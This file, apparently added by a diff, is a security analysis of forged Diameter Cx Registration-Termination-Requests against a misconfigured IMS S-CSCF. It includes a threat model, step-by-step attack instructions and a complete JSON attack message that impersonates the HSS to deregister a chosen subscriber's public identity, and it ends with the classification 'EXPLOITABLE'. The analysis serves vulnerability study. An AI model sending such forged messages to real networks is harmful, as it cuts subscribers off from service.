@@ -1,0 +1,112 @@
+**Threat Model:**
+
+- **Attack Assumption:**  
+  A misconfigured **S-CSCF** exposes its **Cx Diameter client** function to the public Internet. The attacker can impersonate the expected **HSS / Diameter Multimedia server** role and establish an unauthenticated Diameter connection to that S-CSCF. The victim accepts attacker-crafted **Registration-Termination-Request (RTR)** messages and processes them as if received from the HSS.
+
+- **Attacker Capability:**  
+  The attacker can send forged RTRs on its own Diameter connection to the victim S-CSCF and receive the corresponding answers. The attacker cannot interfere with legitimate HSS<->S-CSCF traffic, cannot observe other network links, and has no radio, bearer-plane, or SIP endpoint privilege. The attacker knows the target subscriber's **private identity** for `User-Name` and at least one candidate IMS **public identity**.
+
+**Exploitability Analysis:**
+
+`Public-Identity` in **Cx RTR** is independently security-relevant under this threat model because it is not descriptive metadata; it is the **authoritative scope selector** for which IMS public identities the S-CSCF deregisters.
+
+Normally, RTR is sent **HSS -> S-CSCF**. In this request, `Public-Identity` is a **top-level repeated AVP** (`*[ Public-Identity ]`) of type **UTF8String**. Per the supplied evidence, it carries one or more IMS **Public User Identities / Public Service Identities** in SIP or TEL URI form, and in the network-initiated deregistration procedure it represents the **list of Public Identities that are de-registered**.
+
+This matters because the S-CSCF does not treat the field as advisory. It uses it immediately to determine the **affected identities** and then **removes all information stored in the S-CSCF for those identities**. The resulting impact is concrete and subscriber-visible:
+
+1. the selected public identity or identities are deregistered;
+2. local registration state and associated service-profile state for those identities are removed;
+3. the S-CSCF performs network-initiated deregistration behavior for those identities, including reg-event **NOTIFY** and third-party **REGISTER** toward relevant ASs;
+4. IMS service for those identities remains unavailable until later **re-registration** or equivalent legitimate restoration.
+
+The key field-specific point is that forging an RTR in general causes deregistration behavior, but `Public-Identity` changes **which identities** are actually impacted. RTR can also operate without `Public-Identity`, using private-identity scope to affect all associated public identities in some procedure variants. When `Public-Identity` is present, however, it narrows or specifies the deregistration target set. Therefore, changing this field value changes the subset of AoRs / service profiles purged by the S-CSCF. That is a distinct operational effect attributable to the field itself, not merely to sending an RTR at all.
+
+The state impact is meaningful and semi-persistent. The S-CSCF deletes local state for the selected identities, and recovery depends on a later successful IMS registration cycle. That makes the effect stronger than transient parsing or logging influence. It is an IMS-scoped denial-of-service / state-corruption primitive against selected public identities.
+
+**Attack Procedure:**
+
+Craft a minimal but coherent **Registration-Termination-Request** from the attacker-controlled Diameter connection to the victim S-CSCF, including only mandatory and coherence-related AVPs needed for plausible processing. Use a `Deregistration-Reason` value for which explicit `Public-Identity` presence is meaningful; `NEW_SERVER_ASSIGNED` is appropriate because the evidence states `Public-Identity` shall be present in that case.
+
+Set:
+
+- `User-Name` to the target subscriber's **private identity**
+- `Public-Identity` to the specific IMS public identity to be deregistered, e.g. `sip:alice@example.com`
+- `Deregistration-Reason/Reason-Code` to `NEW_SERVER_ASSIGNED`
+
+Expected success condition: the S-CSCF accepts the RTR, treats that `Public-Identity` as an affected identity, removes local registration/service-profile state for it, and the subscriber loses IMS service for that public identity until re-registration restores state.
+
+**Attack Message:**
+```json
+{
+  "diameter_header": {
+    "command_code": 304,
+    "application_id": 16777216,
+    "request": true,
+    "proxiable": true
+  },
+  "avps": [
+    {
+      "avp_name": "Session-Id",
+      "avp_value": "attacker-hss.example.net;1710000000;1001"
+    },
+    {
+      "avp_name": "Vendor-Specific-Application-Id",
+      "grouped_avp": [
+        {
+          "avp_name": "Vendor-Id",
+          "avp_value": 10415
+        },
+        {
+          "avp_name": "Auth-Application-Id",
+          "avp_value": 16777216
+        }
+      ]
+    },
+    {
+      "avp_name": "Auth-Session-State",
+      "avp_value": 1
+    },
+    {
+      "avp_name": "Origin-Host",
+      "avp_value": "hss.attacker.example.net"
+    },
+    {
+      "avp_name": "Origin-Realm",
+      "avp_value": "example.net"
+    },
+    {
+      "avp_name": "Destination-Realm",
+      "avp_value": "ims.example.com"
+    },
+    {
+      "avp_name": "Destination-Host",
+      "avp_value": "scscf1.ims.example.com"
+    },
+    {
+      "avp_name": "User-Name",
+      "avp_value": "alice-private@example.com"
+    },
+    {
+      "avp_name": "Deregistration-Reason",
+      "grouped_avp": [
+        {
+          "avp_name": "Reason-Code",
+          "avp_value": "NEW_SERVER_ASSIGNED"
+        },
+        {
+          "avp_name": "Reason-Info",
+          "avp_value": "Network-initiated deregistration"
+        }
+      ]
+    },
+    {
+      "avp_name": "Public-Identity",
+      "avp_value": "sip:alice@example.com"
+    }
+  ]
+}
+```
+
+**Classification:**
+
+- `EXPLOITABLE`
